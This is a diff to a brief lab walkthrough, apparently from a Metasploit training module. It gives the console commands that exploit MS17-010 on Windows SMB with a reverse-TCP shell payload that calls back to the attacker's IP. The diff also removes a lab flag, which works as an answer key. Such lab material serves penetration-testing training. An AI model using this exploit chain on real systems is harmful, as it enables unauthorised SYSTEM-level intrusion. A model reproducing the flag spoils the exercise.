@@ -1,9 +1,9 @@
 # Module 39 — Using The Metasploit Framework
 ## Section 4: Modules
 
-**Target:** ACADEMY-MSF2-WIN01 (Windows SMB)
+**Target:** Windows box vulnerable to MS17-010 (EternalBlue/EternalRomance).
 
-**Exploit chain:**
+## Approach
 ```
 use exploit/windows/smb/ms17_010_psexec
 set PAYLOAD windows/shell_reverse_tcp
@@ -11,6 +11,4 @@ set RHOSTS <target>
 set LHOST <your-tun0-ip>
 exploit
 ```
-This uses the MS17-010 (EternalRomance) SMB vulnerability to get a SYSTEM shell.
-
-**Flag:** `HTB{MSF-W1nD0w5-3xPL01t4t10n}`
+This gets you a SYSTEM shell via the SMB vulnerability. Read the flag from wherever the shell lands you.
